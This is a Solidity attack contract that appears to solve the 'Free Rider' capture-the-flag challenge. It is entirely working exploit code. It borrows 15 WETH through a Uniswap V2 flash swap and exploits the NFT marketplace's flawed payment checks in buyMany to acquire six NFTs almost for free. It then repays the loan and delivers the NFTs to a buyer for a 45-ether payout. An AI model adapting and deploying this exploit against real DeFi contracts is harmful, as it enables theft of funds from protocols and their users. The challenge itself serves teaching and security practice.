pragma solidity ^0.8.0;

import "../free-rider/FreeRiderNFTMarketplace.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IWETH {
  function withdraw(uint) external;
  function deposit() external payable;
  function transfer(address, uint) external returns(bool);
  function balanceOf(address) external returns(uint);
}

interface NFT {
  function safeTransferFrom(address, address, uint) external;
}

interface IUniswapV2Pair {
  function token0() external view returns (address);
  function token1() external view returns (address);
  function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

contract FreeRiderAttack {

  address public immutable factory;
  IUniswapV2Pair public immutable pair;
  FreeRiderNFTMarketplace public immutable marketplace;
  address public immutable buyer;
  NFT public immutable nft;

  uint256 flashswapFee;
  address owner;

  constructor(address _factory, address _pair, address _marketplace, address _buyer, address _nft) public {
    factory = _factory;
    pair = IUniswapV2Pair(_pair);
    marketplace = FreeRiderNFTMarketplace(payable(_marketplace));
    buyer = _buyer;
    nft = NFT(_nft);
    owner = msg.sender;
  }

  function attack() external payable {
    flashswapFee = msg.value;
    pair.swap(15 ether, 0, address(this), "123");
    flashswapFee = 0;
    for (uint i = 0; i < 6; i++) {
      nft.safeTransferFrom(address(this), buyer, i);
    }
    require(owner.balance >= 45 ether, "not received funds");
  }

  function uniswapV2Call(address, uint amount0, uint, bytes calldata) external {
    address token0 = IUniswapV2Pair(msg.sender).token0();

    IWETH weth = IWETH(token0);
    weth.withdraw(amount0);

    uint256[] memory tokenIds = new uint256[](6);
    tokenIds[0] = 0;
    tokenIds[1] = 1;
    tokenIds[2] = 2;
    tokenIds[3] = 3;
    tokenIds[4] = 4;
    tokenIds[5] = 5;
    marketplace.buyMany{value: amount0}(tokenIds);

    uint256 depositAmount = amount0 + flashswapFee;
    weth.deposit{value: depositAmount}();
    weth.transfer(msg.sender, depositAmount);
  }

  receive() external payable {}

  function onERC721Received(
      address,
      address,
      uint256 _tokenId,
      bytes memory
    ) external returns (bytes4) 
    {
      return IERC721Receiver.onERC721Received.selector;
    }
}